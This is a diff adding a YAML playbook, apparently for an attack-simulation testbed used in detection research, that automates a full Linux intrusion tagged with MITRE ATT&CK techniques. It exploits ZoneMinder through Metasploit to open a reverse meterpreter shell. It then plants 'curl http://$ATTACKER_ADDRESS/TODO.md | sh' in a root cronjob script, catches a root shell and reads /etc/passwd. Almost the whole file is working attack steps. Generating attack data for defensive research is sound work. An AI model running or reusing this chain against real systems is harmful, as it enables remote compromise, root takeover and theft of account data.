@@ -1,0 +1,119 @@
+####################
+#
+# Priviledge escalation (like Scenario 1 e a)
+#
+####################
+vars:
+  $SERVER_ADDRESS: video.attackbed.com
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $TARGET_ADDRESS: 192.42.1.175
+  $DOMAIN: attackbed.com
+  $USER: aecid
+
+commands:
+
+#### use zoneminder exploit to gain foothold ####
+
+  - type: msf-module
+    cmd: exploit/unix/webapp/zoneminder_snapshots
+    creates_session: "foothold"
+    options:
+      RHOSTS: $TARGET_ADDRESS
+    payload_options:
+      LHOST: 192.42.1.174
+    payload: cmd/unix/python/meterpreter/reverse_tcp
+    metadata:
+      techniques: "T1190,T1059.006"
+      tactics: "Initial Access"
+      technique_name: "Exploit Public-Facing Application,Command and Scripting Interpreter: Python"
+
+  - type: msf-session
+    cmd: shell
+    session: "foothold"
+
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
+ 
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
+ 
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
+ 
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: "foothold"
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter"
+
+##### modify misconfigured cronjob to get reverse shell with root access ####
+
+  - type: msf-session
+    cmd: vim /usr/share/awffull/awffull
+    session: "foothold"
+
+  - type: msf-session
+    cmd: ":inoremap jj <ESC>"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "o"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "curl http://$ATTACKER_ADDRESS/TODO.md | sh"
+    session: "foothold"
+    metadata:
+      techniques: "T1053"
+      tactics: "Execution,Persistence,Privilege Escalation"
+
+  - type: msf-session
+    cmd: "jj"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: ":wq!\n"
+    session: "foothold"
+    metadata:
+      techniques: "T1053"
+      tactics: "Execution,Persistence,Privilege Escalation"
+
+##### msf-session as root ####
+
+  - type: msf-module
+    cmd: exploit/multi/handler
+    creates_session: "root"
+    payload_options:
+      LHOST: 192.42.1.174
+    payload: cmd/unix/python/meterpreter/reverse_tcp
+
+  - type: msf-session
+    stdapi: True
+    cmd: "getuid"
+    session: "root"
+
+  - type: msf-session
+    session: "root"
+    cmd: cat /etc/passwd
+    metadata:
+      techniques: "T1087.001"
+      tactics: "Discovery"
+      technique_name: "Account Discovery: Local Account"
+
